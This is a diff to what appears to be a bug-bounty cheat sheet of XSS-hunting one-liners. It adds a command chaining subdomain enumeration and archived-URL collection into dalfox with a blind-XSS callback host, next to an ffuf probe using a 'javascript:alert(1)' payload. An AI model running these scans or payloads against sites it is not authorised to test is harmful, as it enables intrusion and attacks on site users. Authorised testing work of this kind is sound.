@@ -128,6 +128,11 @@ cat targets | waybackurls | anew | grep "=" | gf xss | nilo | Gxss -p test | dal
 cat hosts.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)" 
 ```
 
+> @SaraBadran18
+```bash
+cat domainlist.txt | subfinder | dnsx | waybackurl | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | uro | dalfox pipe -b your.xss.ht -o xss.txt
+```
+
 ## Find XSS + knoxss
 > @ofjaaah
 ```bash
